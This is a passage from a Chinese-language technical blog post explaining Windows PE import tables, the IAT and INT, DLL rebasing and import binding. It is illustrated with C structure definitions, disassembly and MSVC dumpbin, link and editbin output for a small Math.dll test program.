class="comment">//导入库名指针</span></span><br><span class="line">     DWORD FirstThunk;<span class="comment">//导入地址表IAT,import address table</span></span><br><span class="line">   &#125; IMAGE_IMPORT_DESCRIPTOR;</span><br></pre></td></tr></table></figure>
<p>一开始时,OriginalFirstThunk和FirstThunk都是各自指向一个IMAGE_THUNK_DATA结构体数组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_THUNK_DATA32</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">DWORD ForwarderString;</span><br><span class="line">DWORD Function;</span><br><span class="line">DWORD Ordinal;<span class="comment">//序号</span></span><br><span class="line">DWORD AddressOfData;<span class="comment">//指向IMAGE_IMPORT_BY_NAME</span></span><br><span class="line">     &#125; u1;</span><br><span class="line">   &#125; IMAGE_THUNK_DATA32;</span><br><span class="line">   <span class="keyword">typedef</span> IMAGE_THUNK_DATA32 *PIMAGE_THUNK_DATA32;</span><br></pre></td></tr></table></figure>
<p>后来INT还是指向这个结构体数组不变,但是IAT需要填上函数的实际地址</p>
<h3 id="image_import_by_name">IMAGE_IMPORT_BY_NAME</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_IMPORT_BY_NAME</span> &#123;</span></span><br><span class="line">  WORD Hint;<span class="comment">//该符号最有可能的序号</span></span><br><span class="line">  CHAR Name[<span class="number">1</span>];<span class="comment">//该符号的符号名</span></span><br><span class="line">&#125; IMAGE_IMPORT_BY_NAME,*PIMAGE_IMPORT_BY_NAME;</span><br></pre></td></tr></table></figure>
<p>动态链接器拿到符号名之后还得先去查对应库导出的函数名表,用得到的下标再去查符号序号对应表,得到的值才是序号,减去base再查导出地址表得到真正的函数地址</p>
<p>如果Hint就是目标符号的序号,则直接减去base就可以查出导出地址了</p>
<p>因此动态链接器会首先尝试使用Hint作为目标符号的序号,减去base去查导出地址表.但是这种方法不一定命中,因为导入时认为的函数序号和库中的序号可能不同.因此需要验证是否命中.</p>
<blockquote>
<p>书上没有给出验证方法,我的猜测是,用Hint查符号名称对应表得到的下标,拿去直接访问符号名表,看看对应符号名是否和IMAGE_IMPORT_BY_NAME.name相同,相同则命中</p>
</blockquote>
<p>如果没有命中再用符号名从头查,符号名是最靠谱的</p>
<h3 id="间接调用指令">间接调用指令</h3>
<p>TestMath主函数中调用了Math库的Sub函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> result=Sub(<span class="number">1.0</span>,<span class="number">8.9</span>);</span><br></pre></td></tr></table></figure>
<p>其反汇编指令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">140001014</span>:	ff <span class="number">15</span> <span class="number">3</span>e <span class="number">52</span> <span class="number">01</span> <span class="number">00</span>    	call   QWORD PTR [rip+<span class="number">0x1523e</span>]        # <span class="number">0x140016258</span></span><br><span class="line"><span class="number">14000101</span>a:	f2 <span class="number">0f</span> <span class="number">11</span> <span class="number">44</span> <span class="number">24</span> <span class="number">20</span>    	movsd  QWORD PTR [rsp+<span class="number">0x20</span>],xmm0</span><br></pre></td></tr></table></figure>
<p>这有一个间接调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call   QWORD PTR [rip+<span class="number">0x1523e</span>]</span><br></pre></td></tr></table></figure>
<p>把内存中rip+0x1523e这个地址上的四字拿出来再当作一个64位内存地址,调用该地址</p>
<blockquote>
<p>如果写成<code>call  rip+0x1523e</code>就相当于直接调用<code>rip+0x1523e</code>这个地址</p>
</blockquote>
<p>0x140016258这个地方是啥呢?IAT</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.idata:<span class="number">0000000140016258</span> ; Imports from Math.dll</span><br><span class="line">.idata:<span class="number">0000000140016258</span> ;</span><br><span class="line">.idata:<span class="number">0000000140016258</span>                 extrn Sub:qword         ; CODE XREF: main+<span class="number">14</span>↑p</span><br></pre></td></tr></table></figure>
<p>idata段,给Math.dll建立的的导入地址表IAT,其中只有一项,Sub的桩代码,占用四字64个字节</p>
<p>显然日后这个位置需要填入正确的函数地址,这样看IAT表就相当于GOT表</p>
<h3 id="declspecdllimport-1">__declspec(dllimport)</h3>
<p>TestMath.exe针对Math.dll的导入地址表IAT中只有一项,是因为在TestMath.c中只声明导入了一个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__declspec(dllimport) <span class="type">double</span> <span class="title function_">Sub</span><span class="params">(<span class="type">double</span>,<span class="type">double</span>)</span>;</span><br></pre></td></tr></table></figure>
<p>这个声明告诉编译器Sub符号是从外部导入的,关于它的调用指令啃腚是间接调用.</p>
<blockquote>
<p>在引入<code>__desclpec</code>关键字之前,编译器是不知道一个函数是本地的还是导入的,它统一都生成直接调用指令.</p>
<p>如果是本模块的函数,则编译器给他写上正确的地址.如果本模块中没有</p>
<p>这个直接调用的操作数是一个桩地址,其上只有一条指令,跳转指令,跳转到真正的函数地址.这个真正的函数地址是链接器填上的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CALL 0x0040100C </span><br><span class="line">    ... </span><br><span class="line">0x0040100C: JMP DWORD PTR [0x0040D11C]</span><br></pre></td></tr></table></figure>
<p>0x4D11C还是在IAT表中,<code>DWORD PTR [0x0040D11C]</code>才是真正的函数地址</p>
</blockquote>
<h2 id="导入函数的定位过程">导入函数的定位过程</h2>
<figure>
<img
src="https://img-blog.csdnimg.cn/20200229233124198.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zNzY3MzMzMQ==,size_16,color_FFFFFF,t_70"
alt="在这里插入图片描述" />
<figcaption aria-hidden="true">在这里插入图片描述</figcaption>
</figure>
<p>装载前,OriginalFirstThunk和FirstThunk指向不同的地方,但是其中的数据相同</p>
<p>装载结束后,导入函数定位完成,OriginalFirstThunk指向的INT表不变,但是FirstThunk指向的IAT变成了函数的实际地址</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/20170820114205491"
alt="这里写图片描述" />
<figcaption aria-hidden="true">这里写图片描述</figcaption>
</figure>
<h2 id="装载时重定位">装载时重定位</h2>
<p>Rebasing,重定基地址</p>
<p>DLL中的代码段不是地址无关的,都是以DLL的基地址为基准,计算位置.</p>
<p>一般情况下,EXE程序是第一个装载进入虚拟内存的,没人和他争抢虚拟地址空间,exe程序就可以准确的装载进入ImageBase指定的基地址.在32位windows上这个地址通常是0x400000</p>
<p>而DLL就没有这么幸运了,DLL的默认基地址是0x10000000,假设第一个DLL需要装载时其基地址没有被占用.当第二个DLL需要装载时,其ImageBase恰好和第一个DLL相同,但是这个坑已经有人占了,那么第二个DLL应该放到哪里呢?</p>
<p>满足地址16K对齐要求的前提下找一个能放开此DLL的地方塞进去.</p>
<p>但是问题又来了.</p>
<p>对于64位Math.dll,其基地址是0x180000000,对于需要rip相对寻址的符号比如函数尚且好说.</p>
<p>但是对于需要绝对寻址的符号比如全局变量,假设其原地址为0x180001000,现在由于其他库早于Math.dll装载进入了0x180000000这个位置,那么Math.dll就得另寻他处,比如0x180010000,那么这个全局变量就得放到0x180011000.</p>
<p>所有引用到它的指令都需要被重定位,将该全局变量的位置从0x180001000修改为0x180011000
<span class="math display">\[
新符号位置-旧符号位置=新ImageBase-旧ImageBase
\]</span> 问题又来了</p>
<p>如果一个DLL装载进入A进程地址空间的0x180000000,装载进入B进程地址空间的0x180011000,那么该DLL中的一个需要绝对寻址的符号,在A进程地址空间中所有关于它的指令的操作数都得是0x180001000,在B进程地址空间中是0x180011000.</p>
<p>那么两个进程就得各自持有一份DLL的拷贝,这与linux上位置无关的so动态库不同.so只需要在物理内存中存在一份,映射进入多个进程的地址空间.DLL得有几个进程就得在物理内存中有几个拷贝</p>
<h3 id="系统dll">系统DLL</h3>
<p>系统DLL比如kernel32.dll,user32.dll,gdi32.dll等等</p>
<p>开发人员在设计操作系统的时候就已经给他们刻意安排了一个基地址,不大容易和其他dll冲突</p>
<table>
<thead>
<tr>
<th>windows XP 32位 系统dll</th>
<th>imagebase</th>
</tr>
</thead>
<tbody>
<tr>
<td>user32</td>
<td>77D10000h</td>
</tr>
<tr>
<td>kernel32</td>
<td>77E40000h</td>
</tr>
<tr>
<td>shell32</td>
<td>773A0000h</td>
</tr>
<tr>
<td>gdi32</td>
<td>77C40000h</td>
</tr>
</tbody>
</table>
<h3 id="导入函数绑定">导入函数绑定</h3>
<p>系统DLL每次加载进入进程地址空间的位置基本是不变的,一个函数今天加载到0x1800001000,明天又加载到0x1800001000,后天,大后天,一辈子都是这个位置.那么每次程序运行时都进行符号解析重定位多是一件废事儿啊</p>
<p>可以在运行之间就"确定"库函数的地址,即地址绑定.如果真的在装载时发生重定位,那时候再重新计算符号的真正地址也不迟.</p>
<p>绑定前的导入表:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\86135\Desktop\math&gt;dumpbin TestMath.exe /IMPORTS</span><br><span class="line">Microsoft (R) COFF/PE Dumper Version 14.31.31106.2</span><br><span class="line">Copyright (C) Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Dump of file TestMath.exe</span><br><span class="line"></span><br><span class="line">File Type: EXECUTABLE IMAGE</span><br><span class="line"></span><br><span class="line">  Section contains the following imports:</span><br><span class="line"></span><br><span class="line">    MATH.dll</span><br><span class="line">                414110 Import Address Table</span><br><span class="line">                41A640 Import Name Table</span><br><span class="line">                     0 time date stamp</span><br><span class="line">                     0 Index of first forwarder reference</span><br><span class="line"></span><br><span class="line">                    2 Sub</span><br><span class="line"></span><br><span class="line">    KERNEL32.dll</span><br><span class="line">                414000 Import Address Table</span><br><span class="line">                41A530 Import Name Table</span><br><span class="line">                     0 time date stamp</span><br><span class="line">                     0 Index of first forwarder reference</span><br><span class="line"></span><br><span class="line">                  367 HeapFree</span><br><span class="line">                  639 WriteConsoleW</span><br><span class="line">                  46D QueryPerformanceCounter</span><br><span class="line">                  ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>地址绑定后的导入表:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\<span class="number">86135</span>\Desktop\math&gt;dumpbin TestMath.exe /IMPORTS</span><br><span class="line"><span class="title function_">Microsoft</span> <span class="params">(R)</span> COFF/PE Dumper Version 14.31.31106.2</span><br><span class="line"><span class="title function_">Copyright</span> <span class="params">(C)</span> Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Dump of file TestMath.exe</span><br><span class="line"></span><br><span class="line">File Type: EXECUTABLE IMAGE</span><br><span class="line"></span><br><span class="line">  Section contains the following imports:</span><br><span class="line"></span><br><span class="line">    MATH.dll</span><br><span class="line">                414110 Import Address Table</span><br><span class="line">                41A640 Import Name Table</span><br><span class="line">              FFFFFFFF time date stamp</span><br><span class="line">              FFFFFFFF Index of first forwarder reference</span><br><span class="line"></span><br><span class="line">      10001020      2 Sub</span><br><span class="line"></span><br><span class="line">    KERNEL32.dll</span><br><span class="line">                414000 Import Address Table</span><br><span class="line">                41A530 Import Name Table</span><br><span class="line">              FFFFFFFF time date stamp</span><br><span class="line">              FFFFFFFF Index of first forwarder reference</span><br><span class="line"></span><br><span class="line">      6B815FE0    367 HeapFree</span><br><span class="line">      6B81F1F0    63A WriteConsoleW</span><br><span class="line">      6B819970    46D QueryPerformanceCounter</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>可以发现每个导入函数都有了一个绝对地址,然而此时还是在文件中,没有加载进入内存,就已经预料到导入符号的地址了</p>
<blockquote>
<p>然而这个关闭ASLR之后用od调试运行TestMath.exe可以发现实际上kernel32.dll和Math.dll并没有装载进入这里的位置</p>
</blockquote>
<h2 id="工具">工具</h2>
<h3 id="msvc">MSVC</h3>
<h4 id="调整msvc环境变量">调整MSVC环境变量</h4>
<p>现在的x86_64机器上MSVC默认将源代码编译成64位程序,如果需要编译成32位程序,则需要调整环境</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Visual Studio\<span class="number">2017</span>\Community\VC\Auxiliary\Build</span><br></pre></td></tr></table></figure>
<p>这个文件夹下有几个写好的修改环境的bat文件(微软不建议自己手敲代码修改环境,因为需要修改的变量比较多)</p>
<p>执行其中一共bat就可以修改环境</p>
<p>或者直接运行相应环境的shell工具</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220817095545711.png"
alt="image-20220817095545711" />
<figcaption aria-hidden="true">image-20220817095545711</figcaption>
</figure>
<h4 id="cl-c-只编译不链接">cl /c 只编译不链接</h4>
<h4 id="cl-ld-创建动态库文件">cl /LD 创建动态库文件</h4>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\desktop\testDLL&gt; cl /LDd Math.c</span><br><span class="line">用于 x64 的 Microsoft (<span class="built_in">R</span>) C/C++ 优化编译器 <span class="number">19.31</span>.<span class="number">31106.2</span> 版</span><br><span class="line">版权所有(C) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">Math.c</span><br><span class="line">Microsoft (<span class="built_in">R</span>) Incremental Linker Version <span class="number">14.31</span>.<span class="number">31106.2</span></span><br><span class="line">Copyright (C) Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">/out:Math.dll</span><br><span class="line">/dll</span><br><span class="line">/implib:Math.lib</span><br><span class="line">Math.obj</span><br><span class="line">  正在创建库 Math.lib 和对象 Math.exp</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cl /LDd Math.c  #创建带有调试信息的Math.dll动态库</span><br></pre></td></tr></table></figure>
<h4 id="link-dll-将obj文件制作为动态库">link /dll
将obj文件制作为动态库</h4>
<h4 id="link-dll-export-设置导出符号">link /dll /EXPORT:<符号名>
设置导出符号</h4>
<h4 id="link-dll-fixed-禁止产生重定位信息">link /dll /FIXED
禁止产生重定位信息</h4>
<h4 id="link-dll-base-指定基地址">link /dll /BASE 指定基地址</h4>
<h3 id="dumpbin">dumpbin</h3>
<h4 id="dumpbin-exports观察导出符号">dumpbin /EXPORTS观察导出符号</h4>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>\desktop\testDLL&gt; dumpbin /EXPORTS Math.dll</span><br><span class="line">Microsoft (<span class="built_in">R</span>) COFF/PE Dumper Version <span class="number">14.31</span>.<span class="number">31106.2</span></span><br><span class="line">Copyright (C) Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Dump of file Math.dll</span><br><span class="line"></span><br><span class="line">File <span class="built_in">Type</span>: DLL</span><br><span class="line"></span><br><span class="line">  Section contains the following exports <span class="keyword">for</span> Math.dll</span><br><span class="line"></span><br><span class="line">    <span class="number">00000000</span> characteristics</span><br><span class="line">    FFFFFFFF time date stamp</span><br><span class="line">        <span class="number">0.00</span> version</span><br><span class="line">           <span class="number">1</span> ordinal base</span><br><span class="line">           <span class="number">3</span> number of functions</span><br><span class="line">           <span class="number">3</span> number of names</span><br><span class="line"></span><br><span class="line">    ordinal hint RVA      name</span><br><span class="line"></span><br><span class="line">          <span class="number">1</span>    <span class="number">0</span> <span class="number">00001000</span> Add</span><br><span class="line">          <span class="number">2</span>    <span class="number">1</span> <span class="number">00001040</span> Mul</span><br><span class="line">          <span class="number">3</span>    <span class="number">2</span> <span class="number">00001020</span> Sub</span><br><span class="line"></span><br><span class="line">  Summary</span><br><span class="line"></span><br><span class="line">        <span class="number">3000</span> .data</span><br><span class="line">        <span class="number">3000</span> .pdata</span><br><span class="line">       <span class="number">13000</span> .rdata</span><br><span class="line">        <span class="number">1000</span> .reloc</span><br><span class="line">       <span class="number">3</span>C000 .text</span><br><span class="line">        <span class="number">1000</span> _RDATA</span><br></pre></td></tr></table></figure>
<h4 id="dumpbin-imports-观察导入符号">dumpbin /IMPORTS 观察导入符号</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\desktop\Math&gt; dumpbin /IMPORTS Math.dll</span><br><span class="line"><span class="title function_">Microsoft</span> <span class="params">(R)</span> COFF/PE Dumper Version 14.31.31106.2</span><br><span class="line"><span class="title function_">Copyright</span> <span class="params">(C)</span> Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Dump of file Math.dll</span><br><span class="line"></span><br><span class="line">File Type: DLL</span><br><span class="line"></span><br><span class="line">  Section contains the following imports:</span><br><span class="line"></span><br><span class="line">    KERNEL32.dll</span><br><span class="line">             18000F000 Import Address Table</span><br><span class="line">             180017E68 Import Name Table</span><br><span class="line">                     0 time date stamp</span><br><span class="line">                     0 Index of first forwarder reference</span><br><span class="line"></span><br><span class="line">                         470 QueryPerformanceCounter</span><br><span class="line">                         233 GetCurrentProcessId</span><br><span class="line">                         237 GetCurrentThreadId</span><br><span class="line">						...</span><br><span class="line">                          DA CreateFileW</span><br><span class="line">                          94 CloseHandle</span><br><span class="line"></span><br><span class="line">  Summary</span><br><span class="line"></span><br><span class="line">        2000 .data</span><br><span class="line">        1000 .pdata</span><br><span class="line">        A000 .rdata</span><br><span class="line">        1000 .reloc</span><br><span class="line">        E000 .text</span><br><span class="line">        1000 _RDATA</span><br></pre></td></tr></table></figure>
<h4 id="dumpbin-relocations-观察重定位信息">dumpbin /RELOCATIONS
观察重定位信息</h4>
<h3 id="editbin">editbin</h3>
<h4 id="editbin-rebasebase-修改基地址">editbin /REBASE:BASE=<新基址>
修改基地址</h4>
<h4 id="editbin-bind-绑定导入函数">editbin /BIND 绑定导入函数</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\desktop\Math&gt; dumpbin /IMPORTS TestMath.exe</span><br><span class="line"><span class="title function_">Microsoft</span> <span class="params">(R)</span> COFF/PE Dumper Version 14.31.31106.2</span><br><span class="line"><span class="title function_">Copyright</span> <span class="params">(C)</span> Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Dump of file TestMath.exe</span><br><span class="line"></span><br><span class="line">File Type: EXECUTABLE IMAGE</span><br><span class="line"></span><br><span class="line">  Section contains the following imports:</span><br><span class="line"></span><br><span class="line">    Math.dll</span><br><span class="line">             140016258 Import Address Table</span><br><span class="line">             140020060 Import Name Table</span><br><span class="line">                     0 time date stamp</span><br><span class="line">                     0 Index of first forwarder reference</span><br><span class="line"></span><br><span class="line">                           2 Sub</span><br><span class="line"></span><br><span class="line">    KERNEL32.dll</span><br><span class="line">             140016000 Import Address Table</span><br><span class="line">             14001FE08 Import Name Table</span><br><span class="line">                     0 time date stamp</span><br><span class="line">                     0 Index of first forwarder reference</span><br><span class="line"></span><br><span class="line">                         370 HeapFree</span><br><span class="line">                         64A WriteConsoleW</span><br><span class="line">                         470 QueryPerformanceCounter</span><br><span class="line">                         233 GetCurrentProcessId</span><br><span class="line">                         237 GetCurrentThreadId</span><br><span class="line">                         30A GetSystemTimeAsFileTime</span><br><span class="line">                         38A InitializeSListHead</span><br><span class="line">                         4F5 RtlCaptureContext</span><br><span class="line">                         4FD RtlLookupFunctionEntry</span><br><span class="line">                         504 RtlVirtualUnwind</span><br><span class="line">                         3A0 IsDebuggerPresent</span><br><span class="line">                         5E6 UnhandledExceptionFilter</span><br><span class="line">                         5A4 SetUnhandledExceptionFilter</span><br><span class="line">                         2F1 GetStartupInfoW</span><br><span class="line">                         3A8 IsProcessorFeaturePresent</span><br><span class="line">                         295 GetModuleHandleW</span><br><span class="line">                          DA CreateFileW</span><br><span class="line">                         503 RtlUnwindEx</span><br><span class="line">                         27D GetLastError</span><br><span class="line">                         564 SetLastError</span><br><span class="line">                         149 EnterCriticalSection</span><br><span class="line">                         3E0 LeaveCriticalSection</span><br><span class="line">                         123 DeleteCriticalSection</span><br><span class="line">                         386 InitializeCriticalSectionAndSpinCount</span><br><span class="line">                         5D6 TlsAlloc</span><br><span class="line">                         5D8 TlsGetValue</span><br><span class="line">                         5D9 TlsSetValue</span><br><span class="line">                         5D7 TlsFree</span><br><span class="line">                         1C5 FreeLibrary</span><br><span class="line">                         2CD GetProcAddress</span><br><span class="line">                         3E6 LoadLibraryExW</span><br><span class="line">                         145 EncodePointer</span><br><span class="line">                         487 RaiseException</span><br><span class="line">                         4FF RtlPcToFileHeader</span><br><span class="line">                         2F3 GetStdHandle</span><br><span class="line">                         64B WriteFile</span><br><span class="line">                         291 GetModuleFileNameW</span><br><span class="line">                         232 GetCurrentProcess</span><br><span class="line">                         178 ExitProcess</span><br><span class="line">                         5C4 TerminateProcess</span><br><span class="line">                         294 GetModuleHandleExW</span><br><span class="line">                         1F0 GetCommandLineA</span><br><span class="line">                         1F1 GetCommandLineW</span><br><span class="line">                         36C HeapAlloc</span><br><span class="line">                         1B4 FlsAlloc</span><br><span class="line">                         1B6 FlsGetValue</span><br><span class="line">                         1B7 FlsSetValue</span><br><span class="line">                         1B5 FlsFree</span><br><span class="line">                          AA CompareStringW</span><br><span class="line">                         3D4 LCMapStringW</span><br><span class="line">                         26A GetFileType</span><br><span class="line">                         18F FindClose</span><br><span class="line">                         195 FindFirstFileExW</span><br><span class="line">                         1A6 FindNextFileW</span><br><span class="line">                         3AE IsValidCodePage</span><br><span class="line">                         1CC GetACP</span><br><span class="line">                         2B6 GetOEMCP</span><br><span class="line">                         1DB GetCPInfo</span><br><span class="line">                         412 MultiByteToWideChar</span><br><span class="line">                         637 WideCharToMultiByte</span><br><span class="line">                         253 GetEnvironmentStringsW</span><br><span class="line">                         1C4 FreeEnvironmentStringsW</span><br><span class="line">                         546 SetEnvironmentVariableW</span><br><span class="line">                         57F SetStdHandle</span><br><span class="line">                         2F8 GetStringTypeW</span><br><span class="line">                         2D4 GetProcessHeap</span><br><span class="line">                         1B9 FlushFileBuffers</span><br><span class="line">                         21A GetConsoleOutputCP</span><br><span class="line">                         216 GetConsoleMode</span><br><span class="line">                         268 GetFileSizeEx</span><br><span class="line">                         555 SetFilePointerEx</span><br><span class="line">                         375 HeapSize</span><br><span class="line">                         373 HeapReAlloc</span><br><span class="line">                          94 CloseHandle</span><br><span class="line"></span><br><span class="line">  Summary</span><br><span class="line"></span><br><span class="line">        2000 .data</span><br><span class="line">        2000 .pdata</span><br><span class="line">        B000 .rdata</span><br><span class="line">        1000 .reloc</span><br><span class="line">       15000 .text</span><br><span class="line">        1000 _RDATA</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/08/17/windows%20SDK%20chapter%207%20mouse/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
